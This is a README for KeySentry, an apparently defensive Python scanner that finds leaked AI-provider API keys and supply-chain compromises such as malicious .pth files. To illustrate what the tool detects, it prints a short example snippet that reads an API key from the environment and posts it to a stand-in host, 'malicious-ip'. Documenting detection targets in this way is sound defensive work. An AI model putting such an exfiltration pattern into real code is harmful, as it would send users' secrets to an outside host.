# KeySentry - API Key Security Scanner

[![Python](https://img.shields.io/badge/Python-3.6+-green.svg)](https://www.python.org/)
[![Zero Dependencies](https://img.shields.io/badge/Dependencies-0-success.svg)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)]()

**Zero-Dependency AI Security Scanner • Instant Detection • Protect Your Infrastructure**

## Overview

KeySentry is a lightweight, zero-dependency security tool designed to detect leaked API keys and supply chain attacks in your codebase. It scans your project files to identify exposed credentials before they can be exploited.

### Key Features

- **Zero Dependencies**: Runs with Python standard library only
- **Instant Scanning**: Fast recursive directory analysis
- **Supply Chain Detection**: Specialized detection for AI infrastructure attacks
- **Multi-Platform Support**: Covers major AI service providers
- **Cross-Platform**: Works on Windows, macOS, and Linux

## Installation

No installation required. Simply clone and run:

```bash
git clone https://github.com/daaimengermengzhu/KeySentry.git
cd KeySentry
```

## Usage

```bash
# Scan current directory
python sentry.py

# Scan specific directory
python sentry.py /path/to/project

# Quiet mode (only show warnings)
python sentry.py -q
```

## Detection Capabilities

### API Key Detection

KeySentry identifies exposed API keys from major platforms:

| Platform | Pattern |
|----------|---------|
| OpenAI | `sk-...` |
| Anthropic | `sk-ant-...` |
| Google AI | `AIza...` |
| Groq | `gsk_...` |
| xAI | `xai-...` |
| Mistral | `mistral-...` |
| DeepSeek | `sk-...` |
| Xiaomi MiMo | `mi-...` |
| Moonshot | `sk-...` |
| Zhipu AI | `sk-...` |
| Alibaba Qwen | `sk-...` |

### Supply Chain Attack Detection

KeySentry now includes specialized detection for AI infrastructure supply chain attacks, including:

- **Suspicious .pth files**: Detection of `litellm_init.pth` or malicious files in site-packages
- **Dangerous code patterns**: Identification of environment variable exfiltration combined with network requests
- **File system monitoring**: Scanning for unauthorized modifications to Python path configurations

Example malicious pattern detected:
```python
import os
import requests
# Dangerous combination: accessing environment + network exfiltration
secrets = os.environ.get('API_KEY')
requests.post('http://malicious-ip/collect', data={'key': secrets})
```

## Output Format

KeySentry provides clear, categorized reports:

```
======================================================================
  KeySentry - API密钥安全扫描工具 v1.1
======================================================================

【 扫描统计 】
  📂 已扫描文件数: 42

【 ⚠️ 敏感信息 】
  🆘 发现 2 处 API 密钥泄露！

  #1  config.py:15
      sk-abc...xyz (OpenAI)

【 ☣️ 恶意组件 】
  🆘 发现供应链攻击特征！

  #1  litellm_init.pth
      检测到 LiteLLM 供应链攻击特征

【🛠️ 修复建议】
  👉 立即撤销泄露的 API 密钥
  👉 物理隔离受影响的开发环境
  👉 检查并清理可疑的 .pth 文件
```

## Security Features

### Smart .gitignore Analysis

KeySentry automatically checks if your `.gitignore` properly excludes:

- Environment files (`.env`, `.env.local`)
- Virtual environments (`venv/`, `.venv/`)
- IDE configurations (`.vscode/`, `.idea/`)
- Python cache (`__pycache__/`)

### Auto-Fix Capability

When issues are detected, KeySentry can automatically generate or update your `.gitignore`:

```bash
# Enable auto-fix mode
python sentry.py --fix
```

## File Types Scanned

```
Python:    .py
JavaScript: .js, .ts
Config:    .env, .json, .yaml, .yml, .toml, .cfg, .ini, .conf
```

## Directories Ignored

```
node_modules  __pycache__  .git  venv  .venv
dist  build  .idea  .vscode
```

## Why KeySentry?

- **Prevent Financial Loss**: Leaked API keys can cost hundreds to thousands of dollars
- **No Setup Required**: Works immediately with Python 3.6+
- **Fast**: Scans thousands of files in seconds
- **Reliable**: Battle-tested regex patterns for accurate detection
- **Extensible**: Easy to add new platform detection patterns

## Contributing

Contributions are welcome! Please feel free to submit issues or pull requests.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Security Notice

If you discover a security vulnerability in KeySentry itself, please report it responsibly by opening an issue or contacting the maintainers directly.

---

**KeySentry** - Protecting your API infrastructure, one scan at a time.
Note: Unlike some naive Python scanners that might accidentally execute the payload (as pointed out by security experts in Issue #24512), KeySentry uses strict static text analysis (Regex) and will NEVER execute the suspicious .pth or .py files. It is completely safe to run in compromised environments."
